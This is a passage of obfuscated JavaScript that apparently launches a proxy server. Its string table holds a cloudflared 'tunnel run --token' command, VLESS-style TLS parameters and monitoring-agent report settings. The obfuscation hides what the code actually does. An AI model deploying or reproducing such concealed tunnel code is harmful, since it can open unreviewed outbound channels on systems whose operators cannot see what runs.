p_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','9TJNxAO','config.yaml','?encryption=none&security=tls&sni=','2053','base64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','stringify'];_0x3ac9=function(){return _0x4790d1;};return _0x3ac9();}startserver()[_0x1a8486(0x131)](_0x5984aa=>{const _0x40aca0=_0x1a8486;console[_0x40aca0(0xc7)](_0x40aca0(0x14a),_0x5984aa);}),app[_0x1a8486(0x117)](PORT,()=>console[_0x1a8486(0xfe)](_0x1a8486(0xe2)+PORT+'!'));
